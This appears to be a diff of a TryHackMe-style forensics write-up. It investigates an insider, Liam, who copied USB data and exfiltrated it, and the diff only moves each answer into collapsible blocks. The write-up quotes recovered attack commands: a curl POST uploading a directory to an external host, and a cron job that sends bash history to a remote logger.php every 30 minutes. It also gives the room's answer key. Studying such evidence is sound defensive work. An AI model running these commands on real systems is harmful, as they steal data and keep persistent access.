@@ -19,9 +19,10 @@ First artefact we could utilize to determine the login time is `wtmp` and normal
 
 To get the accurate timestamp, we will utilize the `auth.log` with `grep "session opened" auth.log -a | grep gdm` command to display all session opened event from GNOME Display Manager (gdm) which is the normal way when logged in to the system via GUI and for some reasons, this room accepted the timestamp display on the log directly without converting to UTC so we can copy timestamp from the last line and change "T" to space to answer this. 
 
-```
-2025-02-28 10:59:07
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>2025-02-28 10:59:07</code></pre>
+</details>
 
 >What was the timezone of Liam’s device?
 
@@ -29,9 +30,10 @@ To get the accurate timestamp, we will utilize the `auth.log` with `grep "sessio
 
 We can get the timezone of Unix-like system from the `etc/timezone` file as shown in the image above.
 
-```
-America/Toronto
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>America/Toronto</code></pre>
+</details>
 
 >What is the serial number of the USB that was inserted by Liam?
 
@@ -39,14 +41,17 @@ America/Toronto
 
 We can cheese our way out from the `/mnt/liam_disk/var/log` with the command `grep -i usb ./*` to display everything that has "usb" string in it which we will find the Product name, Serial number, Manufacturer, connected and disconnected time from the `syslog` as shown in the above image.
 
-```
-2651931097993496666
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>2651931097993496666</code></pre>
+</details>
 
 >When was the USB connected to the system? (Format: YYYY-MM-DD HH:MM:SS)
-```
-2025-02-28 10:59:25
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>2025-02-28 10:59:25</code></pre>
+</details>
 
 >What command was executed when Liam ran 'transferfiles'?
 
@@ -54,9 +59,10 @@ We can cheese our way out from the `/mnt/liam_disk/var/log` with the command `gr
 
 There is a `transferfiles` command was executed on the `.bash_history` which mean the user executed this command but I could not find this binary from any of the path so I used `grep` to find for this string which I found out from the result that Liam added alias to `.bashrc` which will execute copy command to copy all files from USB drive to `Data` directory located on the Documents folder of liam's user. this is a very tricky way to hide the actual command execution from bash history.
 
-```
-cp -r \"/media/liam/46E8E28DE8E27A97/Critical Data TECH THM\" /home/liam/Documents/Data
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>cp -r \"/media/liam/46E8E28DE8E27A97/Critical Data TECH THM\" /home/liam/Documents/Data</code></pre>
+</details>
 
 >What command did Liam execute to transfer the exfiltrated files to an external server?
 
@@ -64,9 +70,10 @@ cp -r \"/media/liam/46E8E28DE8E27A97/Critical Data TECH THM\" /home/liam/Documen
 
 Its time to look at the bash history again which we can see that after listing usb, the user then copied all files from usb to `Data` directory then use `set -o history` to make sure that command execution from shell will be logged in the bash history which Liam then proceeded to use curl to exfiltrate files from `Data` directory to `http://tehc-thm.thm/upload` once all files were successfully copied to `Data` directory.
 
-```
-curl -X POST -d @/home/liam/Documents/Data http://tehc-thm.thm/upload
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>curl -X POST -d @/home/liam/Documents/Data http://tehc-thm.thm/upload</code></pre>
+</details>
 
 >What is the IP address of the domain to which Liam transferred the files to?
 
@@ -74,9 +81,10 @@ curl -X POST -d @/home/liam/Documents/Data http://tehc-thm.thm/upload
 
 We can look `/etc/hosts` file that matches an FQDN with the server IP of specific domain and we can see that the previously found domain was mapped to 5.45.102.93 on Liam's system.
 
-```
-5.45.102.93
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>5.45.102.93</code></pre>
+</details>
 
 >Which directory was the user in when they created the file 'mth'?
 
@@ -84,9 +92,10 @@ We can look `/etc/hosts` file that matches an FQDN with the server IP of specifi
 
 We are back to `auth.log` that stores the command history of `sudo` which we found from the bash history that user used `sudo` with `nano` to created `mth` file so we can use this log to find the PWD or working directory when this command was executed and we can see that the command was executed from Liam's home directory. 
 
-```
-/home/liam
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>/home/liam</code></pre>
+</details>
 
 >Remember Henry, the external entity helping Liam during the exfiltration? What was the amount in USD that Henry had to give Liam for this exfiltration task?
 
@@ -94,9 +103,10 @@ We are back to `auth.log` that stores the command history of `sudo` which we fou
 
 Its time to read the content of `mth` file which we can see that Henry offered Liam $10000 for this work.
 
-```
-10000
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>10000</code></pre>
+</details>
 
 >When was the USB disconnected by Liam? (Format: YYYY-MM-DD HH:MM:SS)
 
@@ -104,9 +114,10 @@ Its time to read the content of `mth` file which we can see that Henry offered L
 
 Back to `syslog`, we can see the USB disconnected event happened at 11:44:00 (-05.00 UTC) indicates by the string "USB disconnect, device number 2"
 
-```
-2025-02-28 11:44:00
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>2025-02-28 11:44:00</code></pre>
+</details>
 
 >There is a .hidden/ folder that Liam listed the contents of in his commands. What is the full path of this directory?
 
@@ -118,9 +129,10 @@ We can check out the home directory of liam user which we can see that even thou
 
 And then we can see that there is another `.hidden` folder on this directory so this is the one we are looking for.
 
-```
-/home/liam/Public
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>/home/liam/Public</code></pre>
+</details>
 
 >Which files are likely timstomped in this .hidden/ directory (answer in alphabetical order, ascending, separated by a comma. e.g example1.txt,example2.txt)
 
@@ -132,9 +144,10 @@ Lets check out `.hidden` directory, and then we can see that there are 8 empty t
 
 We can use `stat` command to find out the MACB timestamp of both files which we can see that the actual file creation (Birth) of both file aligns with the timeline of this incident and we also confirmed the timestomping technique as well. 
 
-```
-file3.txt,file7.txt
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>file3.txt,file7.txt</code></pre>
+</details>
 
 >Liam thought the work was done, but the external entity had other plans. Which IP address was connected via SSH to Liam's machine a few hours after the exfiltration? 
 
@@ -142,9 +155,10 @@ file3.txt,file7.txt
 
 We can find out the logon timestamp via SSH from `auth.log` file with the simple command such as `grep -i -a Accepted auth.log` which reveals the successful authentication with the password on SSH, and we can see that we only have 1 record and it was connected from the external IP as well.
 
-```
-94.102.51.15
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>94.102.51.15</code></pre>
+</details>
 
 >Which cronjob did the external entity set up inside Liam’s machine?
 
@@ -152,9 +166,10 @@ We can find out the logon timestamp via SSH from `auth.log` file with the simple
 
 I didn't see anything from `/etc/crontab` so I checked out the `/var/spool/cron/crontab` which I found cronjob of liam user exfiltrate last 5 commands from bash history every 30 minute to the website hosting on 192.168.1.23
 
-```
-*/30 * * * * curl -s -X POST -d "$(whoami):$(tail -n 5 ~/.bash_history)" http://192.168.1.23/logger.php
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>*/30 * * * * curl -s -X POST -d "$(whoami):$(tail -n 5 ~/.bash_history)" http://192.168.1.23/logger.php</code></pre>
+</details>
 
 ![dd55176cb3873b987ce4770523790032.png](/resources/dd55176cb3873b987ce4770523790032.png)
 
